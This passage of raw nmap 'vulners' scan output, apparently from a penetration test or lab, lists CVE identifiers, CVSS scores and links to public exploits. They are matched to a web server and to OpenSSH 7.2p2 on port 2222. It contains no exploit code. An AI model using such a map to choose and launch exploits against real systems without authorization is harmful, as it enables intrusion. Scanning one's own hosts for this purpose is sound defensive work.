|       B5E74010-A082-5ECE-AB37-623A5B33FE7D    7.5     https://vulners.com/githubexploit/B5E74010-A082-5ECE-AB37-623A5B33FE7D  *EXPLOIT*
|       B58E6202-6D04-5CB0-8529-59713C0E13B8    7.5     https://vulners.com/githubexploit/B58E6202-6D04-5CB0-8529-59713C0E13B8  *EXPLOIT*
|       B53D7077-1A2B-5640-9581-0196F6138301    7.5     https://vulners.com/githubexploit/B53D7077-1A2B-5640-9581-0196F6138301  *EXPLOIT*
|       B0B1EF25-DE18-534A-AE5B-E6E87669C1D2    7.5     https://vulners.com/githubexploit/B0B1EF25-DE18-534A-AE5B-E6E87669C1D2  *EXPLOIT*
|       B0208442-6E17-5772-B12D-B5BE30FA5540    7.5     https://vulners.com/githubexploit/B0208442-6E17-5772-B12D-B5BE30FA5540  *EXPLOIT*
|       A9C7FB0F-65EC-5557-B6E8-6AFBBF8F140F    7.5     https://vulners.com/githubexploit/A9C7FB0F-65EC-5557-B6E8-6AFBBF8F140F  *EXPLOIT*
|       A820A056-9F91-5059-B0BC-8D92C7A31A52    7.5     https://vulners.com/githubexploit/A820A056-9F91-5059-B0BC-8D92C7A31A52  *EXPLOIT*
|       A66531EB-3C47-5C56-B8A6-E04B54E9D656    7.5     https://vulners.com/githubexploit/A66531EB-3C47-5C56-B8A6-E04B54E9D656  *EXPLOIT*
|       A3F15BCE-08AD-509D-AE63-9D3D8E402E0B    7.5     https://vulners.com/githubexploit/A3F15BCE-08AD-509D-AE63-9D3D8E402E0B  *EXPLOIT*
|       A0F268C8-7319-5637-82F7-8DAF72D14629    7.5     https://vulners.com/githubexploit/A0F268C8-7319-5637-82F7-8DAF72D14629  *EXPLOIT*
|       9EE3F7E3-70E6-503E-9929-67FE3F3735A2    7.5     https://vulners.com/githubexploit/9EE3F7E3-70E6-503E-9929-67FE3F3735A2  *EXPLOIT*
|       9D511461-7D24-5402-8E2A-58364D6E758F    7.5     https://vulners.com/githubexploit/9D511461-7D24-5402-8E2A-58364D6E758F  *EXPLOIT*
|       9CEA663C-6236-5F45-B207-A873B971F988    7.5     https://vulners.com/githubexploit/9CEA663C-6236-5F45-B207-A873B971F988  *EXPLOIT*
|       987C6FDB-3E70-5FF5-AB5B-D50065D27594    7.5     https://vulners.com/githubexploit/987C6FDB-3E70-5FF5-AB5B-D50065D27594  *EXPLOIT*
|       9814661A-35A4-5DB7-BB25-A1040F365C81    7.5     https://vulners.com/githubexploit/9814661A-35A4-5DB7-BB25-A1040F365C81  *EXPLOIT*
|       89732403-A14E-5A5D-B659-DD4830410847    7.5     https://vulners.com/githubexploit/89732403-A14E-5A5D-B659-DD4830410847  *EXPLOIT*
|       7C40F14D-44E4-5155-95CF-40899776329C    7.5     https://vulners.com/githubexploit/7C40F14D-44E4-5155-95CF-40899776329C  *EXPLOIT*
|       789B6112-E84C-566E-89A7-82CC108EFCD9    7.5     https://vulners.com/githubexploit/789B6112-E84C-566E-89A7-82CC108EFCD9  *EXPLOIT*
|       788F7DF8-01F3-5D13-9B3E-E4AA692153E6    7.5     https://vulners.com/githubexploit/788F7DF8-01F3-5D13-9B3E-E4AA692153E6  *EXPLOIT*
|       788E0E7C-6F5C-5DAD-9E3A-EE6D8A685F7D    7.5     https://vulners.com/githubexploit/788E0E7C-6F5C-5DAD-9E3A-EE6D8A685F7D  *EXPLOIT*
|       749F952B-3ACF-56B2-809D-D66E756BE839    7.5     https://vulners.com/githubexploit/749F952B-3ACF-56B2-809D-D66E756BE839  *EXPLOIT*
|       6E484197-456B-55DF-8D51-C2BB4925F45C    7.5     https://vulners.com/githubexploit/6E484197-456B-55DF-8D51-C2BB4925F45C  *EXPLOIT*
|       6BCBA83C-4A4C-58D7-92E4-DF092DFEF267    7.5     https://vulners.com/githubexploit/6BCBA83C-4A4C-58D7-92E4-DF092DFEF267  *EXPLOIT*
|       68E78C64-D93A-5E8B-9DEA-4A8D826B474E    7.5     https://vulners.com/githubexploit/68E78C64-D93A-5E8B-9DEA-4A8D826B474E  *EXPLOIT*
|       68A13FF0-60E5-5A29-9248-83A940B0FB02    7.5     https://vulners.com/githubexploit/68A13FF0-60E5-5A29-9248-83A940B0FB02  *EXPLOIT*
|       6758CFA9-271A-5E99-A590-E51F4E0C5046    7.5     https://vulners.com/githubexploit/6758CFA9-271A-5E99-A590-E51F4E0C5046  *EXPLOIT*
|       674BA200-C494-57E6-B1B4-1672DDA15D3C    7.5     https://vulners.com/githubexploit/674BA200-C494-57E6-B1B4-1672DDA15D3C  *EXPLOIT*
|       5A864BCC-B490-5532-83AB-2E4109BB3C31    7.5     https://vulners.com/githubexploit/5A864BCC-B490-5532-83AB-2E4109BB3C31  *EXPLOIT*
|       5A54F5DA-F9C1-508B-AD2D-3E45CD647D31    7.5     https://vulners.com/githubexploit/5A54F5DA-F9C1-508B-AD2D-3E45CD647D31  *EXPLOIT*
|       4E5A5BA8-3BAF-57F0-B71A-F04B4D066E4F    7.5     https://vulners.com/githubexploit/4E5A5BA8-3BAF-57F0-B71A-F04B4D066E4F  *EXPLOIT*
|       4C79D8E5-D595-5460-AA84-18D4CB93E8FC    7.5     https://vulners.com/githubexploit/4C79D8E5-D595-5460-AA84-18D4CB93E8FC  *EXPLOIT*
|       4B14D194-BDE3-5D7F-A262-A701F90DE667    7.5     https://vulners.com/githubexploit/4B14D194-BDE3-5D7F-A262-A701F90DE667  *EXPLOIT*
|       45D138AD-BEC6-552A-91EA-8816914CA7F4    7.5     https://vulners.com/githubexploit/45D138AD-BEC6-552A-91EA-8816914CA7F4  *EXPLOIT*
|       41F0C2DA-2A2B-5ACC-A98D-CAD8D5AAD5ED    7.5     https://vulners.com/githubexploit/41F0C2DA-2A2B-5ACC-A98D-CAD8D5AAD5ED  *EXPLOIT*
|       40879618-C556-547C-8769-9E63E83D0B55    7.5     https://vulners.com/githubexploit/40879618-C556-547C-8769-9E63E83D0B55  *EXPLOIT*
|       4051D2EF-1C43-576D-ADB2-B519B31F93A0    7.5     https://vulners.com/githubexploit/4051D2EF-1C43-576D-ADB2-B519B31F93A0  *EXPLOIT*
|       3CF66144-235E-5F7A-B889-113C11ABF150    7.5     https://vulners.com/githubexploit/3CF66144-235E-5F7A-B889-113C11ABF150  *EXPLOIT*
|       379FCF38-0B4A-52EC-BE3E-408A0467BF20    7.5     https://vulners.com/githubexploit/379FCF38-0B4A-52EC-BE3E-408A0467BF20  *EXPLOIT*
|       365CD0B0-D956-59D6-9500-965BF4017E2D    7.5     https://vulners.com/githubexploit/365CD0B0-D956-59D6-9500-965BF4017E2D  *EXPLOIT*
|       2E98EA81-24D1-5D5B-80B9-A8D616BF3C3F    7.5     https://vulners.com/githubexploit/2E98EA81-24D1-5D5B-80B9-A8D616BF3C3F  *EXPLOIT*
|       2B4FEB27-377B-557B-AE46-66D677D5DA1C    7.5     https://vulners.com/githubexploit/2B4FEB27-377B-557B-AE46-66D677D5DA1C  *EXPLOIT*
|       2A177215-CE4A-5FA7-B016-EEAF332D165C    7.5     https://vulners.com/githubexploit/2A177215-CE4A-5FA7-B016-EEAF332D165C  *EXPLOIT*
|       1F6E0709-DA03-564E-925F-3177657C053E    7.5     https://vulners.com/githubexploit/1F6E0709-DA03-564E-925F-3177657C053E  *EXPLOIT*
|       1B75F2E2-5B30-58FA-98A4-501B91327D7F    7.5     https://vulners.com/githubexploit/1B75F2E2-5B30-58FA-98A4-501B91327D7F  *EXPLOIT*
|       18AE455A-1AA7-5386-81C2-39DA02CEFB57    7.5     https://vulners.com/githubexploit/18AE455A-1AA7-5386-81C2-39DA02CEFB57  *EXPLOIT*
|       17C6AD2A-8469-56C8-BBBE-1764D0DF1680    7.5     https://vulners.com/githubexploit/17C6AD2A-8469-56C8-BBBE-1764D0DF1680  *EXPLOIT*
|       1337DAY-ID-38427        7.5     https://vulners.com/zdt/1337DAY-ID-38427        *EXPLOIT*
|       1337DAY-ID-37030        7.5     https://vulners.com/zdt/1337DAY-ID-37030        *EXPLOIT*
|       1337DAY-ID-36937        7.5     https://vulners.com/zdt/1337DAY-ID-36937        *EXPLOIT*
|       1337DAY-ID-36897        7.5     https://vulners.com/zdt/1337DAY-ID-36897        *EXPLOIT*
|       1145F3D1-0ECB-55AA-B25D-A26892116505    7.5     https://vulners.com/githubexploit/1145F3D1-0ECB-55AA-B25D-A26892116505  *EXPLOIT*
|       108A0713-4AB8-5A1F-A16B-4BB13ECEC9B2    7.5     https://vulners.com/githubexploit/108A0713-4AB8-5A1F-A16B-4BB13ECEC9B2  *EXPLOIT*
|       0C28A0EC-7162-5D73-BEC9-B034F5392847    7.5     https://vulners.com/githubexploit/0C28A0EC-7162-5D73-BEC9-B034F5392847  *EXPLOIT*
|       0BC014D0-F944-5E78-B5FA-146A8E5D0F8A    7.5     https://vulners.com/githubexploit/0BC014D0-F944-5E78-B5FA-146A8E5D0F8A  *EXPLOIT*
|       06076ECD-3FB7-53EC-8572-ABBB20029812    7.5     https://vulners.com/githubexploit/06076ECD-3FB7-53EC-8572-ABBB20029812  *EXPLOIT*
|       00EC8F03-D8A3-56D4-9F8C-8DD1F5ACCA08    7.5     https://vulners.com/githubexploit/00EC8F03-D8A3-56D4-9F8C-8DD1F5ACCA08  *EXPLOIT*
|       CVE-2023-38709  7.3     https://vulners.com/cve/CVE-2023-38709
|       CVE-2020-35452  7.3     https://vulners.com/cve/CVE-2020-35452
|       CNVD-2024-36395 7.3     https://vulners.com/cnvd/CNVD-2024-36395
|       EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB    7.2     https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB    *EXPLOIT*
|       1337DAY-ID-32502        7.2     https://vulners.com/zdt/1337DAY-ID-32502        *EXPLOIT*
|       95499236-C9FE-56A6-9D7D-E943A24B633A    6.9     https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
|       FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8    6.8     https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8  *EXPLOIT*
|       4427DEE4-E1E2-5A16-8683-D74750941604    6.8     https://vulners.com/githubexploit/4427DEE4-E1E2-5A16-8683-D74750941604  *EXPLOIT*
|       0095E929-7573-5E4A-A7FA-F6598A35E8DE    6.8     https://vulners.com/githubexploit/0095E929-7573-5E4A-A7FA-F6598A35E8DE  *EXPLOIT*
|       CVE-2024-24795  6.3     https://vulners.com/cve/CVE-2024-24795
|       CVE-2024-39884  6.2     https://vulners.com/cve/CVE-2024-39884
|       CVE-2020-1927   6.1     https://vulners.com/cve/CVE-2020-1927
|       CVE-2019-10098  6.1     https://vulners.com/cve/CVE-2019-10098
|       CVE-2019-10092  6.1     https://vulners.com/cve/CVE-2019-10092
|       CVE-2016-4975   6.1     https://vulners.com/cve/CVE-2016-4975
|       CVE-2023-45802  5.9     https://vulners.com/cve/CVE-2023-45802
|       CVE-2018-1302   5.9     https://vulners.com/cve/CVE-2018-1302
|       CVE-2018-1301   5.9     https://vulners.com/cve/CVE-2018-1301
|       CVE-2018-11763  5.9     https://vulners.com/cve/CVE-2018-11763
|       CVE-2016-1546   5.9     https://vulners.com/cve/CVE-2016-1546
|       45F0EB7B-CE04-5103-9D40-7379AE4B6CDD    5.8     https://vulners.com/githubexploit/45F0EB7B-CE04-5103-9D40-7379AE4B6CDD  *EXPLOIT*
|       1337DAY-ID-33577        5.8     https://vulners.com/zdt/1337DAY-ID-33577        *EXPLOIT*
|       CVE-2020-13938  5.5     https://vulners.com/cve/CVE-2020-13938
|       CVE-2022-37436  5.3     https://vulners.com/cve/CVE-2022-37436
|       CVE-2022-28614  5.3     https://vulners.com/cve/CVE-2022-28614
|       CVE-2022-28330  5.3     https://vulners.com/cve/CVE-2022-28330
|       CVE-2021-30641  5.3     https://vulners.com/cve/CVE-2021-30641
|       CVE-2020-1934   5.3     https://vulners.com/cve/CVE-2020-1934
|       CVE-2020-11985  5.3     https://vulners.com/cve/CVE-2020-11985
|       CVE-2019-17567  5.3     https://vulners.com/cve/CVE-2019-17567
|       CVE-2019-0220   5.3     https://vulners.com/cve/CVE-2019-0220
|       CVE-2019-0196   5.3     https://vulners.com/cve/CVE-2019-0196
|       CVE-2018-17189  5.3     https://vulners.com/cve/CVE-2018-17189
|       CVE-2018-1283   5.3     https://vulners.com/cve/CVE-2018-1283
|       CNVD-2023-30859 5.3     https://vulners.com/cnvd/CNVD-2023-30859
|       CNVD-2022-53582 5.3     https://vulners.com/cnvd/CNVD-2022-53582
|       CNVD-2022-51059 5.3     https://vulners.com/cnvd/CNVD-2022-51059
|       SSV:96537       5.0     https://vulners.com/seebug/SSV:96537    *EXPLOIT*
|       EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7    5.0     https://vulners.com/exploitpack/EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7    *EXPLOIT*
|       EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    5.0     https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    *EXPLOIT*
|       EXPLOITPACK:2666FB0676B4B582D689921651A30355    5.0     https://vulners.com/exploitpack/EXPLOITPACK:2666FB0676B4B582D689921651A30355    *EXPLOIT*
|       1337DAY-ID-28573        5.0     https://vulners.com/zdt/1337DAY-ID-28573        *EXPLOIT*
|       1337DAY-ID-26574        5.0     https://vulners.com/zdt/1337DAY-ID-26574        *EXPLOIT*
|       FFE89CAE-FAA6-5E93-9994-B5F4D0EC2197    4.3     https://vulners.com/githubexploit/FFE89CAE-FAA6-5E93-9994-B5F4D0EC2197  *EXPLOIT*
|       F893E602-F8EB-5D23-8ABF-920890DB23A3    4.3     https://vulners.com/githubexploit/F893E602-F8EB-5D23-8ABF-920890DB23A3  *EXPLOIT*
|       F463914D-1B20-54CA-BF87-EA28F3ADE2A3    4.3     https://vulners.com/githubexploit/F463914D-1B20-54CA-BF87-EA28F3ADE2A3  *EXPLOIT*
|       ECD5D758-774C-5488-B782-C8996208B401    4.3     https://vulners.com/githubexploit/ECD5D758-774C-5488-B782-C8996208B401  *EXPLOIT*
|       E9FE319B-26BF-5A75-8C6A-8AE55D7E7615    4.3     https://vulners.com/githubexploit/E9FE319B-26BF-5A75-8C6A-8AE55D7E7615  *EXPLOIT*
|       DF57E8F1-FE21-5EB9-8FC7-5F2EA267B09D    4.3     https://vulners.com/githubexploit/DF57E8F1-FE21-5EB9-8FC7-5F2EA267B09D  *EXPLOIT*
|       D7922C26-D431-5825-9897-B98478354289    4.3     https://vulners.com/githubexploit/D7922C26-D431-5825-9897-B98478354289  *EXPLOIT*
|       CVE-2016-8612   4.3     https://vulners.com/cve/CVE-2016-8612
|       C26A395B-9695-59E4-908F-866A561936E9    4.3     https://vulners.com/githubexploit/C26A395B-9695-59E4-908F-866A561936E9  *EXPLOIT*
|       C068A003-5258-51DC-A3C0-786638A1B69C    4.3     https://vulners.com/githubexploit/C068A003-5258-51DC-A3C0-786638A1B69C  *EXPLOIT*
|       B8198D62-F9C8-5E03-A301-9A3580070B4C    4.3     https://vulners.com/githubexploit/B8198D62-F9C8-5E03-A301-9A3580070B4C  *EXPLOIT*
|       B4483895-BA86-5CFB-84F3-7C06411B5175    4.3     https://vulners.com/githubexploit/B4483895-BA86-5CFB-84F3-7C06411B5175  *EXPLOIT*
|       A6753173-D2DC-54CC-A5C4-0751E61F0343    4.3     https://vulners.com/githubexploit/A6753173-D2DC-54CC-A5C4-0751E61F0343  *EXPLOIT*
|       A1FF76C0-CF98-5704-AEE4-DF6F1E434FA3    4.3     https://vulners.com/githubexploit/A1FF76C0-CF98-5704-AEE4-DF6F1E434FA3  *EXPLOIT*
|       8FB9E7A8-9A5B-5D87-9A44-AE4A1A92213D    4.3     https://vulners.com/githubexploit/8FB9E7A8-9A5B-5D87-9A44-AE4A1A92213D  *EXPLOIT*
|       8A14FEAD-A401-5B54-84EB-2059841AD1DD    4.3     https://vulners.com/githubexploit/8A14FEAD-A401-5B54-84EB-2059841AD1DD  *EXPLOIT*
|       7248BA4C-3FE5-5529-9E4C-C91E241E8AA0    4.3     https://vulners.com/githubexploit/7248BA4C-3FE5-5529-9E4C-C91E241E8AA0  *EXPLOIT*
|       6E104766-2F7A-5A0A-A24B-61D9B52AD4EE    4.3     https://vulners.com/githubexploit/6E104766-2F7A-5A0A-A24B-61D9B52AD4EE  *EXPLOIT*
|       6C0C909F-3307-5755-97D2-0EBD17367154    4.3     https://vulners.com/githubexploit/6C0C909F-3307-5755-97D2-0EBD17367154  *EXPLOIT*
|       628A345B-5FD8-5A2F-8782-9125584E4C89    4.3     https://vulners.com/githubexploit/628A345B-5FD8-5A2F-8782-9125584E4C89  *EXPLOIT*
|       5D88E443-7AB2-5034-910D-D52A5EFFF5FC    4.3     https://vulners.com/githubexploit/5D88E443-7AB2-5034-910D-D52A5EFFF5FC  *EXPLOIT*
|       500CE683-17EB-5776-8EF6-85122451B145    4.3     https://vulners.com/githubexploit/500CE683-17EB-5776-8EF6-85122451B145  *EXPLOIT*
|       4E4BAF15-6430-514A-8679-5B9F03584B71    4.3     https://vulners.com/githubexploit/4E4BAF15-6430-514A-8679-5B9F03584B71  *EXPLOIT*
|       4B46EB21-DF1F-5D84-AE44-9BCFE311DFB9    4.3     https://vulners.com/githubexploit/4B46EB21-DF1F-5D84-AE44-9BCFE311DFB9  *EXPLOIT*
|       4B44115D-85A3-5E62-B9A8-5F336C24673F    4.3     https://vulners.com/githubexploit/4B44115D-85A3-5E62-B9A8-5F336C24673F  *EXPLOIT*
|       4013EC74-B3C1-5D95-938A-54197A58586D    4.3     https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D  *EXPLOIT*
|       3C5B500C-1858-5834-9D23-38DBE44AE969    4.3     https://vulners.com/githubexploit/3C5B500C-1858-5834-9D23-38DBE44AE969  *EXPLOIT*
|       3B159471-590A-5941-ADED-20F4187E8C63    4.3     https://vulners.com/githubexploit/3B159471-590A-5941-ADED-20F4187E8C63  *EXPLOIT*
|       3AE03E90-26EC-5F91-B84E-F04AF6239A9F    4.3     https://vulners.com/githubexploit/3AE03E90-26EC-5F91-B84E-F04AF6239A9F  *EXPLOIT*
|       37A9128D-17C4-50FF-B025-5FC3E0F3F338    4.3     https://vulners.com/githubexploit/37A9128D-17C4-50FF-B025-5FC3E0F3F338  *EXPLOIT*
|       3749CB78-BE3A-5018-8838-CA693845B5BD    4.3     https://vulners.com/githubexploit/3749CB78-BE3A-5018-8838-CA693845B5BD  *EXPLOIT*
|       27108E72-8DC1-53B5-97D9-E869CA13EFF7    4.3     https://vulners.com/githubexploit/27108E72-8DC1-53B5-97D9-E869CA13EFF7  *EXPLOIT*
|       24ADD37D-C8A1-5671-A0F4-378760FC69AC    4.3     https://vulners.com/githubexploit/24ADD37D-C8A1-5671-A0F4-378760FC69AC  *EXPLOIT*
|       1E6E9010-4BDF-5C30-951C-79C280B90883    4.3     https://vulners.com/githubexploit/1E6E9010-4BDF-5C30-951C-79C280B90883  *EXPLOIT*
|       1337DAY-ID-36854        4.3     https://vulners.com/zdt/1337DAY-ID-36854        *EXPLOIT*
|       1337DAY-ID-33575        4.3     https://vulners.com/zdt/1337DAY-ID-33575        *EXPLOIT*
|       04E3583E-DFED-5D0D-BCF2-1C1230EB666D    4.3     https://vulners.com/githubexploit/04E3583E-DFED-5D0D-BCF2-1C1230EB666D  *EXPLOIT*
|       PACKETSTORM:164501      0.0     https://vulners.com/packetstorm/PACKETSTORM:164501      *EXPLOIT*
|       PACKETSTORM:164418      0.0     https://vulners.com/packetstorm/PACKETSTORM:164418      *EXPLOIT*
|       PACKETSTORM:152441      0.0     https://vulners.com/packetstorm/PACKETSTORM:152441      *EXPLOIT*
|       PACKETSTORM:140265      0.0     https://vulners.com/packetstorm/PACKETSTORM:140265      *EXPLOIT*
|       1337DAY-ID-26497        0.0     https://vulners.com/zdt/1337DAY-ID-26497        *EXPLOIT*
|_      05403438-4985-5E78-A702-784E03F724D4    0.0     https://vulners.com/githubexploit/05403438-4985-5E78-A702-784E03F724D4  *EXPLOIT*
2222/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.2p2: 
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A  *EXPLOIT*
|       CVE-2023-38408  9.8     https://vulners.com/cve/CVE-2023-38408
|       B8190CDB-3EB9-5631-9828-8064A1575B23    9.8     https://vulners.com/githubexploit/B8190CDB-3EB9-5631-9828-8064A1575B23  *EXPLOIT*
|       8FC9C5AB-3968-5F3C-825E-E8DB5379A623    9.8     https://vulners.com/githubexploit/8FC9C5AB-3968-5F3C-825E-E8DB5379A623  *EXPLOIT*
|       8AD01159-548E-546E-AA87-2DE89F3927EC    9.8     https://vulners.com/githubexploit/8AD01159-548E-546E-AA87-2DE89F3927EC  *EXPLOIT*
|       5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A    9.8     https://vulners.com/githubexploit/5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A  *EXPLOIT*
|       2227729D-6700-5C8F-8930-1EEAFD4B9FF0    9.8     https://vulners.com/githubexploit/2227729D-6700-5C8F-8930-1EEAFD4B9FF0  *EXPLOIT*
|       0221525F-07F5-5790-912D-F4B9E2D1B587    9.8     https://vulners.com/githubexploit/0221525F-07F5-5790-912D-F4B9E2D1B587  *EXPLOIT*
|       PACKETSTORM:140070      7.8     https://vulners.com/packetstorm/PACKETSTORM:140070      *EXPLOIT*
|       EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09    7.8     https://vulners.com/exploitpack/EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09    *EXPLOIT*
|       CVE-2020-15778  7.8     https://vulners.com/cve/CVE-2020-15778
|       CVE-2016-10012  7.8     https://vulners.com/cve/CVE-2016-10012
|       CVE-2015-8325   7.8     https://vulners.com/cve/CVE-2015-8325
|       1337DAY-ID-26494        7.8     https://vulners.com/zdt/1337DAY-ID-26494        *EXPLOIT*
|       SSV:92579       7.5     https://vulners.com/seebug/SSV:92579    *EXPLOIT*
|       PACKETSTORM:173661      7.5     https://vulners.com/packetstorm/PACKETSTORM:173661      *EXPLOIT*
|       F0979183-AE88-53B4-86CF-3AF0523F3807    7.5     https://vulners.com/githubexploit/F0979183-AE88-53B4-86CF-3AF0523F3807  *EXPLOIT*
|       EDB-ID:40888    7.5     https://vulners.com/exploitdb/EDB-ID:40888      *EXPLOIT*
|       CVE-2016-8858   7.5     https://vulners.com/cve/CVE-2016-8858
|       CVE-2016-6515   7.5     https://vulners.com/cve/CVE-2016-6515
|       CVE-2016-10708  7.5     https://vulners.com/cve/CVE-2016-10708
|       1337DAY-ID-26576        7.5     https://vulners.com/zdt/1337DAY-ID-26576        *EXPLOIT*
|       CVE-2016-10009  7.3     https://vulners.com/cve/CVE-2016-10009
|       SSV:92582       7.2     https://vulners.com/seebug/SSV:92582    *EXPLOIT*
|       CVE-2021-41617  7.0     https://vulners.com/cve/CVE-2021-41617
|       CVE-2016-10010  7.0     https://vulners.com/cve/CVE-2016-10010
|       SSV:92580       6.9     https://vulners.com/seebug/SSV:92580    *EXPLOIT*
|       95499236-C9FE-56A6-9D7D-E943A24B633A    6.9     https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
|       1337DAY-ID-26577        6.9     https://vulners.com/zdt/1337DAY-ID-26577        *EXPLOIT*
|       PACKETSTORM:189283      6.8     https://vulners.com/packetstorm/PACKETSTORM:189283      *EXPLOIT*
|       F79E574D-30C8-5C52-A801-66FFA0610BAA    6.8     https://vulners.com/githubexploit/F79E574D-30C8-5C52-A801-66FFA0610BAA  *EXPLOIT*
|       EDB-ID:46516    6.8     https://vulners.com/exploitdb/EDB-ID:46516      *EXPLOIT*
|       EDB-ID:46193    6.8     https://vulners.com/exploitdb/EDB-ID:46193      *EXPLOIT*
|       CVE-2025-26465  6.8     https://vulners.com/cve/CVE-2025-26465
|       CVE-2019-6110   6.8     https://vulners.com/cve/CVE-2019-6110
|       CVE-2019-6109   6.8     https://vulners.com/cve/CVE-2019-6109
|       C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3    6.8     https://vulners.com/githubexploit/C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3  *EXPLOIT*
|       1337DAY-ID-39918        6.8     https://vulners.com/zdt/1337DAY-ID-39918        *EXPLOIT*
|       10213DBE-F683-58BB-B6D3-353173626207    6.8     https://vulners.com/githubexploit/10213DBE-F683-58BB-B6D3-353173626207  *EXPLOIT*
|       CVE-2023-51385  6.5     https://vulners.com/cve/CVE-2023-51385
|       EDB-ID:40858    6.4     https://vulners.com/exploitdb/EDB-ID:40858      *EXPLOIT*
|       EDB-ID:40119    6.4     https://vulners.com/exploitdb/EDB-ID:40119      *EXPLOIT*
|       EDB-ID:39569    6.4     https://vulners.com/exploitdb/EDB-ID:39569      *EXPLOIT*
|       CVE-2016-3115   6.4     https://vulners.com/cve/CVE-2016-3115
|       PACKETSTORM:181223      5.9     https://vulners.com/packetstorm/PACKETSTORM:181223      *EXPLOIT*
|       MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS-        5.9     https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS- *EXPLOIT*
|       EDB-ID:40136    5.9     https://vulners.com/exploitdb/EDB-ID:40136      *EXPLOIT*
|       EDB-ID:40113    5.9     https://vulners.com/exploitdb/EDB-ID:40113      *EXPLOIT*
|       CVE-2023-48795  5.9     https://vulners.com/cve/CVE-2023-48795
|       CVE-2020-14145  5.9     https://vulners.com/cve/CVE-2020-14145
|       CVE-2019-6111   5.9     https://vulners.com/cve/CVE-2019-6111
|       CVE-2016-6210   5.9     https://vulners.com/cve/CVE-2016-6210
|       54E1BB01-2C69-5AFD-A23D-9783C9D9FC4C    5.9     https://vulners.com/githubexploit/54E1BB01-2C69-5AFD-A23D-9783C9D9FC4C  *EXPLOIT*
|       EXPLOITPACK:98FE96309F9524B8C84C508837551A19    5.8     https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19    *EXPLOIT*
|       EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    5.8     https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    *EXPLOIT*
|       1337DAY-ID-32328        5.8     https://vulners.com/zdt/1337DAY-ID-32328        *EXPLOIT*
|       1337DAY-ID-32009        5.8     https://vulners.com/zdt/1337DAY-ID-32009        *EXPLOIT*
|       SSV:91041       5.5     https://vulners.com/seebug/SSV:91041    *EXPLOIT*
|       PACKETSTORM:140019      5.5     https://vulners.com/packetstorm/PACKETSTORM:140019      *EXPLOIT*
|       PACKETSTORM:136251      5.5     https://vulners.com/packetstorm/PACKETSTORM:136251      *EXPLOIT*
|       PACKETSTORM:136234      5.5     https://vulners.com/packetstorm/PACKETSTORM:136234      *EXPLOIT*
|       EXPLOITPACK:F92411A645D85F05BDBD274FD222226F    5.5     https://vulners.com/exploitpack/EXPLOITPACK:F92411A645D85F05BDBD274FD222226F    *EXPLOIT*
|       EXPLOITPACK:9F2E746846C3C623A27A441281EAD138    5.5     https://vulners.com/exploitpack/EXPLOITPACK:9F2E746846C3C623A27A441281EAD138    *EXPLOIT*
|       EXPLOITPACK:1902C998CBF9154396911926B4C3B330    5.5     https://vulners.com/exploitpack/EXPLOITPACK:1902C998CBF9154396911926B4C3B330    *EXPLOIT*
|       CVE-2016-10011  5.5     https://vulners.com/cve/CVE-2016-10011
|       1337DAY-ID-25388        5.5     https://vulners.com/zdt/1337DAY-ID-25388        *EXPLOIT*
|       EDB-ID:45939    5.3     https://vulners.com/exploitdb/EDB-ID:45939      *EXPLOIT*
|       EDB-ID:45233    5.3     https://vulners.com/exploitdb/EDB-ID:45233      *EXPLOIT*
|       CVE-2018-20685  5.3     https://vulners.com/cve/CVE-2018-20685
|       CVE-2018-15919  5.3     https://vulners.com/cve/CVE-2018-15919
|       CVE-2018-15473  5.3     https://vulners.com/cve/CVE-2018-15473
|       CVE-2017-15906  5.3     https://vulners.com/cve/CVE-2017-15906
|       CVE-2016-20012  5.3     https://vulners.com/cve/CVE-2016-20012
|       SSH_ENUM        5.0     https://vulners.com/canvas/SSH_ENUM     *EXPLOIT*
|       PACKETSTORM:150621      5.0     https://vulners.com/packetstorm/PACKETSTORM:150621      *EXPLOIT*
|       EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    5.0     https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    *EXPLOIT*
|       EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    5.0     https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    *EXPLOIT*
|       1337DAY-ID-31730        5.0     https://vulners.com/zdt/1337DAY-ID-31730        *EXPLOIT*
|       EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF    4.3     https://vulners.com/exploitpack/EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF    *EXPLOIT*
|       EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF    4.3     https://vulners.com/exploitpack/EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF    *EXPLOIT*
|       1337DAY-ID-25440        4.3     https://vulners.com/zdt/1337DAY-ID-25440        *EXPLOIT*
